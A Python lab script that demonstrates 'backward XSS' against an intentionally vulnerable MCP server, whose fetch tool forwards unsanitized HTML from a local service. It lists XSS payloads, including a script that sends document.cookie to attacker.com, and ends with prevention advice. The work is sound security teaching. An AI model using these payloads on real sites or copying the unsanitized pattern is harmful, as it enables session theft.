#!/usr/bin/env python3
"""
Backward XSS (Cross-Site Scripting) Attack Demonstrations

This script demonstrates Backward XSS attack techniques against the vulnerable MCP server.

Backward XSS Attack: An external service (XSS service) returns malicious HTML/JavaScript
content. The MCP server fetches this content and forwards it to users without sanitization,
allowing XSS payloads to execute in the user's browser.

Vulnerability: The MCP server has an http_get tool that fetches content from external
services and returns it without sanitization. If an external service returns malicious
HTML/JavaScript, the MCP forwards it unsanitized, allowing XSS attacks.

Attack Flow:
1. Attacker sends request to XSS relay service with URL to XSS service
2. Relay service forwards URL to MCP server
3. MCP server fetches HTML/JSON with XSS payloads from XSS service
4. MCP returns unsanitized content to relay service
5. Relay service returns unsanitized content to attacker/user
6. XSS payloads execute in user's browser (if content is rendered)
"""

import asyncio
import sys
import json
import requests
import subprocess
import time
import signal
import os
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

# Track background processes for cleanup
background_processes = []

# Track XSS payloads detected during attacks
xss_payloads_detected = []


# Backward XSS Attack Scenarios
# Demonstrates how external services can return malicious content
# that gets forwarded by MCP without sanitization

BACKWARD_XSS_ATTACK_SCENARIOS = [
    {
        "name": "Backward XSS - Script Tags in HTML",
        "description": "XSS service returns HTML with <script> tags containing malicious JavaScript",
        "url": "http://127.0.0.1:8003/page",
        "expected": "MCP fetches HTML with <script> tags and returns it unsanitized",
        "xss_type": "script_tags",
        "payload": "<script>alert('XSS Attack Successful!')</script>"
    },
    {
        "name": "Backward XSS - Event Handlers in HTML",
        "description": "XSS service returns HTML with event handlers (onerror, onclick, etc.)",
        "url": "http://127.0.0.1:8003/widget",
        "expected": "MCP fetches HTML with event handlers and returns it unsanitized",
        "xss_type": "event_handlers",
        "payload": "onerror=\"alert('XSS')\""
    },
    {
        "name": "Backward XSS - Inline Event Handlers",
        "description": "XSS service returns HTML with inline event handlers (onload, onfocus, etc.)",
        "url": "http://127.0.0.1:8003/embed",
        "expected": "MCP fetches HTML with inline handlers and returns it unsanitized",
        "xss_type": "inline_handlers",
        "payload": "onload=\"alert('XSS')\""
    },
    {
        "name": "Backward XSS - Obvious Marker",
        "description": "XSS service returns HTML with obvious XSS marker for testing",
        "url": "http://127.0.0.1:8003/marker",
        "expected": "MCP fetches HTML with obvious XSS payload and returns it unsanitized",
        "xss_type": "marker",
        "payload": "XSS ATTACK SUCCESSFUL"
    },
    {
        "name": "Backward XSS - JSON with XSS Payload",
        "description": "XSS service returns JSON with XSS payload in content field",
        "url": "http://127.0.0.1:8003/news",
        "expected": "MCP fetches JSON with XSS payload in content and returns it unsanitized",
        "xss_type": "json_xss",
        "payload": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
    },
    {
        "name": "Backward XSS - API Response with XSS",
        "description": "XSS service returns API JSON with XSS payload in body field",
        "url": "http://127.0.0.1:8003/api/content",
        "expected": "MCP fetches API JSON with XSS in body and returns it unsanitized",
        "xss_type": "api_xss",
        "payload": "<script>alert('XSS via JSON API!')</script>"
    }
]


class MCPClientWrapper:
    """Wrapper to make MCP client work for direct tool calls"""
    
    def __init__(self):
        self.session = None
        self.server_params = None
        
    async def initialize(self):
        """Initialize connection to MCP server"""
        project_root = Path(__file__).parent.parent.parent
        
        self.server_params = StdioServerParameters(
            command="python",
            args=["-m", "server.vulnerable_server"],
            env=None,
            cwd=str(project_root)
        )
        
        self.stdio_context = stdio_client(self.server_params)
        self.stdio_transport = await self.stdio_context.__aenter__()
        read, write = self.stdio_transport
        
        self.session_context = ClientSession(read, write)
        self.session = await self.session_context.__aenter__()
        await self.session.initialize()
    
    async def call_tool(self, tool_name: str, arguments: dict) -> dict:
        """Call a tool on the MCP server"""
        if not self.session:
            raise RuntimeError("MCP client not initialized")
            
        try:
            result = await self.session.call_tool(tool_name, arguments)
            if result.content:
                content_text = result.content[0].text if result.content else ""
                try:
                    return json.loads(content_text)
                except json.JSONDecodeError:
                    return {"raw": content_text}
            return {"status": "success"}
        except Exception as e:
            return {"error": str(e)}
    
    async def cleanup(self):
        """Clean up connections"""
        if hasattr(self, 'session_context') and self.session_context:
            await self.session_context.__aexit__(None, None, None)
        if hasattr(self, 'stdio_context') and self.stdio_context:
            await self.stdio_context.__aexit__(None, None, None)


async def create_mcp_client():
    """Create and initialize MCP client"""
    client = MCPClientWrapper()
    await client.initialize()
    return client


async def run_xss_attack_direct(mcp_client, attack_scenario):
    """Run XSS attack by directly calling MCP server"""
    
    print(f"\n{'='*80}")
    print(f"  Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']} (Direct MCP Call)")
    print(f"{'='*80}")
    print(f"Description: {attack_scenario['description']}")
    print(f"Target URL: {attack_scenario['url']}")
    print(f"Expected: {attack_scenario['expected']}")
    print(f"XSS Type: {attack_scenario['xss_type']}")
    print(f"Payload: {attack_scenario['payload']}")
    print(f"{'─'*80}\n")
    
    print(f"[ATTACK] Directly calling MCP http_get tool with URL: {attack_scenario['url']}")
    print(f"[VULNERABILITY] MCP server will fetch content without sanitization")
    
    try:
        result = await mcp_client.call_tool("http_get", {"url": attack_scenario['url']})
        
        print(f"[RESULT] MCP server response:")
        print(json.dumps(result, indent=2))
        
        if result.get("status") == "success":
            content = result.get("content", "")
            
            # Check for XSS payloads in content
            xss_detected = False
            if "<script" in content.lower():
                print(f"\n[WARNING] XSS PAYLOAD DETECTED: <script> tags found in content")
                xss_detected = True
            if "onerror" in content.lower() or "onclick" in content.lower() or "onload" in content.lower():
                print(f"\n[WARNING] XSS PAYLOAD DETECTED: Event handlers found in content")
                xss_detected = True
            if "javascript:" in content.lower():
                print(f"\n[WARNING] XSS PAYLOAD DETECTED: javascript: protocol found in content")
                xss_detected = True
            
            if xss_detected:
                print(f"\n[SUCCESS] [WARNING] Backward XSS attack successful!")
                print(f"[SUCCESS] Malicious content was fetched and returned unsanitized")
                print(f"[SUCCESS] If this content is rendered in a browser, XSS will execute")
                
                # Track XSS payloads
                xss_payloads_detected.append({
                    "attack": attack_scenario['name'],
                    "url": attack_scenario['url'],
                    "xss_type": attack_scenario['xss_type'],
                    "payload": attack_scenario['payload']
                })
        else:
            print(f"\n[RESULT] {result.get('message', 'Unknown error')}")
            
    except Exception as e:
        print(f"[ERROR] Attack failed: {e}")
    
    print(f"{'─'*80}")
    await asyncio.sleep(1)


async def run_xss_attack_via_relay(attack_scenario):
    """Run XSS attack via relay service"""
    
    print(f"\n{'='*80}")
    print(f"  Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']} (via Relay Service)")
    print(f"{'='*80}")
    print(f"Description: {attack_scenario['description']}")
    print(f"Target URL: {attack_scenario['url']}")
    print(f"Expected: {attack_scenario['expected']}")
    print(f"XSS Type: {attack_scenario['xss_type']}")
    print(f"Payload: {attack_scenario['payload']}")
    print(f"{'─'*80}\n")
    
    relay_url = f"http://127.0.0.1:8004/fetch?url={attack_scenario['url']}"
    print(f"[ATTACK] Attacker sends request to XSS relay service (external service): {relay_url}")
    print(f"[ATTACK] Relay service forwards URL to MCP server")
    print(f"[VULNERABILITY] MCP server fetches content from XSS service without sanitization")
    print(f"[VULNERABILITY] MCP server returns unsanitized content to relay service")
    print(f"[VULNERABILITY] Relay service returns unsanitized content to attacker/user")
    print(f"[VULNERABILITY] If content is rendered in browser, XSS payloads will execute!")
    
    try:
        response = requests.get(relay_url, timeout=30)
        result = response.json()
        
        print(f"[RESULT] XSS relay service (external service) response:")
        print(json.dumps(result, indent=2))
        
        if result.get("status") == "success":
            content = result.get("content", "")
            mcp_result = result.get("mcp_result", {})
            
            # Extract content from MCP result (might be JSON)
            if isinstance(mcp_result, dict):
                if "content" in mcp_result:
                    content = mcp_result["content"]
                elif "data" in mcp_result and isinstance(mcp_result["data"], dict):
                    content = mcp_result["data"].get("body", "") or mcp_result["data"].get("content", "")
            
            # Check for XSS payloads in content
            xss_detected = False
            content_to_check = str(content)
            
            if "<script" in content_to_check.lower():
                print(f"\n[SUCCESS] [WARNING] XSS PAYLOAD DETECTED: <script> tags found in content")
                xss_detected = True
            if "onerror" in content_to_check.lower() or "onclick" in content_to_check.lower() or "onload" in content_to_check.lower():
                print(f"\n[SUCCESS] [WARNING] XSS PAYLOAD DETECTED: Event handlers found in content")
                xss_detected = True
            if "javascript:" in content_to_check.lower():
                print(f"\n[SUCCESS] [WARNING] XSS PAYLOAD DETECTED: javascript: protocol found in content")
                xss_detected = True
            
            if xss_detected:
                print(f"\n[SUCCESS] [WARNING] Backward XSS attack successful via relay service!")
                print(f"[SUCCESS] Malicious content was fetched and returned unsanitized")
                print(f"[SUCCESS] If this content is rendered in a browser, XSS will execute")
                
                # Track XSS payloads
                xss_payloads_detected.append({
                    "attack": attack_scenario['name'],
                    "url": attack_scenario['url'],
                    "xss_type": attack_scenario['xss_type'],
                    "payload": attack_scenario['payload'],
                    "via_relay": True
                })
        else:
            print(f"\n[RESULT] {result.get('message', 'Unknown error')}")
            
    except requests.exceptions.ConnectionError:
        print(f"[ERROR] Cannot connect to XSS relay service at http://127.0.0.1:8004")
        print(f"[INFO] Make sure the XSS relay service is running: python -m external_service.xss_relay_service")
    except Exception as e:
        print(f"[ERROR] Attack failed: {e}")
    
    print(f"{'─'*80}")
    await asyncio.sleep(1)


def check_service_running(port: int) -> bool:
    """Check if a service is running on the given port"""
    try:
        response = requests.get(f"http://127.0.0.1:{port}/", timeout=1)
        return response.status_code == 200
    except:
        return False


def start_service(name: str, module: str, port: int) -> subprocess.Popen:
    """Start a service in the background"""
    print(f"[START] Starting {name} on port {port}...")
    try:
        process = subprocess.Popen(
            [sys.executable, "-m", module],
            cwd=str(project_root),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Wait for service to start (check multiple times)
        max_attempts = 10
        for attempt in range(max_attempts):
            time.sleep(0.5)
            if check_service_running(port):
                print(f"[OK] {name} started successfully (PID: {process.pid})")
                return process
            if process.poll() is not None:
                # Process died
                stderr = process.stderr.read() if process.stderr else "Unknown error"
                print(f"[ERROR] {name} process died: {stderr}")
                return None
        
        print(f"[WARNING] {name} may not have started properly")
        return process
    except Exception as e:
        print(f"[ERROR] Failed to start {name}: {e}")
        return None


async def main():
    """Main function to run all backward XSS attack demonstrations"""
    
    print("\n" + "="*80)
    print("  BACKWARD XSS ATTACK DEMONSTRATIONS")
    print("="*80)
    print("\nThis script demonstrates Backward XSS attack techniques")
    print("against the vulnerable MCP server.")
    print("\nBackward XSS: An external service returns malicious HTML/JavaScript")
    print("content. The MCP server fetches this content and forwards it to users")
    print("without sanitization, allowing XSS payloads to execute.")
    print("\n[WARNING] These are real attack demonstrations!")
    print("="*80 + "\n")
    
    # Check if XSS service is running
    print("[CHECK] Checking XSS service (port 8003)...")
    if not check_service_running(8003):
        print("[START] XSS service not running, starting it...")
        xss_service = start_service("XSS Service", "external_service.xss_service", 8003)
        if xss_service:
            background_processes.append(xss_service)
            await asyncio.sleep(2)  # Give it time to start
        else:
            print("[ERROR] Failed to start XSS service")
            return
    else:
        print("[OK] XSS service is running")
    
    # Check if XSS relay service is running
    print("[CHECK] Checking XSS relay service (port 8004)...")
    if not check_service_running(8004):
        print("[START] XSS relay service not running, starting it...")
        xss_relay_service = start_service("XSS Relay Service", "external_service.xss_relay_service", 8004)
        if xss_relay_service:
            background_processes.append(xss_relay_service)
            await asyncio.sleep(2)  # Give it time to start
        else:
            print("[ERROR] Failed to start XSS relay service")
            return
    else:
        print("[OK] XSS relay service is running")
    
    print("\n[OK] All required services are running\n")
    
    # Number the attacks
    for i, attack in enumerate(BACKWARD_XSS_ATTACK_SCENARIOS, 1):
        attack['number'] = i
    
    # Part 1: Direct MCP attacks
    print("\n" + "="*80)
    print("  PART 1: DIRECT MCP ATTACKS")
    print("="*80)
    print("\nDemonstrating backward XSS attacks by directly calling MCP server.")
    print("="*80 + "\n")
    
    mcp_client = await create_mcp_client()
    
    for attack_scenario in BACKWARD_XSS_ATTACK_SCENARIOS:
        await run_xss_attack_direct(mcp_client, attack_scenario)
    
    await mcp_client.cleanup()
    
    # Part 2: Attacks via relay service
    print("\n" + "="*80)
    print("  PART 2: ATTACKS VIA RELAY SERVICE")
    print("="*80)
    print("\nDemonstrating backward XSS attacks via XSS relay service.")
    print("This shows the full attack flow: User → Relay → MCP → XSS Service → User")
    print("="*80 + "\n")
    
    for attack_scenario in BACKWARD_XSS_ATTACK_SCENARIOS:
        await run_xss_attack_via_relay(attack_scenario)
    
    # Summary
    print(f"\n{'='*80}")
    print("  [SUMMARY] Backward XSS Attack Demonstration Complete")
    print("="*80)
    print(f"\n[OK] Ran {len(BACKWARD_XSS_ATTACK_SCENARIOS)} backward XSS attack scenarios")
    print(f"[OK] XSS payloads detected: {len(xss_payloads_detected)}")
    
    if xss_payloads_detected:
        print("\n[WARNING] XSS Payloads Detected:")
        for payload_info in xss_payloads_detected:
            print(f"  - {payload_info['attack']}: {payload_info['xss_type']}")
            if payload_info.get('via_relay'):
                print(f"    (via relay service)")
    
    print("\n[INSIGHTS] Key Takeaways:")
    print("   • Backward XSS: external services return malicious content")
    print("   • MCP server fetches content without sanitization")
    print("   • Unsanitized content is forwarded to users")
    print("   • XSS payloads execute in user's browser if content is rendered")
    print("   • Multiple XSS vectors: script tags, event handlers, inline handlers")
    print("   • Attack flow: User → Relay → MCP → XSS Service → User")
    print("\n[PREVENTION] How to prevent these attacks:")
    print("   • Sanitize all content from external services")
    print("   • Strip HTML tags and JavaScript from responses")
    print("   • HTML-encode content before returning to users")
    print("   • Use Content Security Policy (CSP) headers")
    print("   • Implement output sanitization in backward attack wrapper")
    print("\n" + "="*80 + "\n")
    
    # Cleanup
    print("[CLEANUP] Stopping background services...")
    for process in background_processes:
        try:
            process.terminate()
            process.wait(timeout=2)
        except:
            try:
                process.kill()
            except:
                pass
    print("[OK] Cleanup complete\n")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\nInterrupted. Cleaning up...")
        for process in background_processes:
            try:
                process.terminate()
            except:
                pass
        print("Exiting...\n")

